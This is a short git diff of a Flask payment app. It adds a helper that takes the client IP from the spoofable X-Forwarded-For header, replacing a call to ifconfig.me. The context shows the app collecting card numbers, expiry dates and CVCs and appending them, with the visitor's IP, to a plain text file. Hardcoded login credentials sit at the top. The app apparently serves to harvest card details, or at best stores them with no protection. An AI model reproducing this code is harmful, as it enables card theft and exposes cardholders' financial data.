@@ -10,6 +10,11 @@ app = Flask(__name__)
 USERNAME = '698445212547825547'
 PASSWORD = 'bevendroxmasc888'
 #hostname = socket.gethostname()
+def get_client_ip():
+    if request.headers.getlist("X-Forwarded-For"):
+        return request.headers.getlist("X-Forwarded-For")[0]
+    else:
+        return request.remote_addr
 
 @app.route('/')
 def home():
@@ -42,7 +47,7 @@ def submit_payment():
     card_number = request.form.get('card-number')
     expiry = request.form.get('expiry')  # MM/YY format
     cvc = request.form.get('cvc')
-    user_ip = urllib.request.urlopen('http://ifconfig.me').read().decode('utf8')  # Get the user's IP
+    user_ip = get_client_ip()  # Get the user's IP
 
     # Save the payment information to payment_info.txt
     with open('payment_info.txt', 'a') as f:
